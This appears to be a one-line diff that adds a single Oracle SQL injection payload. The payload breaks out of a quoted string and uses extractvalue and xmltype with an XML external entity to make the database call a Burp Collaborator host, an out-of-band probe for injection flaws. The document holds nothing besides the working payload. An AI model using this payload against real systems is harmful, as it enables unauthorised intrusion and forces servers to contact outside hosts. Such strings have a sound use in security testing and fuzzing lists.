@@ -1,0 +1,1 @@
+8lreM0B9Hm'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % oxhnh SYSTEM "http://akye5v04sxb4sv0r9c7odhsgz750typmtalxel3.burpcollab'||'orator.net/">%oxhnh;]>'),'/l') from dual)||'
